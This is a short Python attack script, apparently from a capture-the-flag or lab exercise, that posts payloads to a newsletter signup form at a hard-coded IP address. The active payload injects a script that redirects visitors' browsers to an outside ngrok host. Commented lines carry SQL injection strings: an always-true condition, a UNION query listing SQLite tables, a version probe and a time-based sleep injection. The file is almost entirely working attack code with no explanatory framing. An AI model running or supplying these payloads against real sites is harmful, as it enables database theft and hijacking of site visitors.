#! /usr/bin/python3
import requests
session=requests.Session()

url="http://18.192.3.151/newsletter/"

success="Your email inserted successfully"

# payload="someuser@gmail.com' or 1=1 -- ##"
email="someuser@gmail.com"
payload=email+"<script>document.location='http://dca39eb1b8f2.ngrok.io';</script>"
print(payload)
# payload="--##"

# TEMPLATE
# insert into users(item,item,item,item) values('value1','value2','value3',' someuser@gmail.com')&&1=4--##('	') 

"""

admin') union select 1,tbl_name,3 from sqlite_master -- ##


' || (select sqlite_version() )) -- ##

"""

data={"email":payload}

# insert into (1,2,3) values ('','','	')&&sleep(400)--##	')


response=session.post(url,data=data)
content=response.text
headers=response.headers

if success.lower() in content.lower():
	print(content)
	print(headers)
else:
	print(content)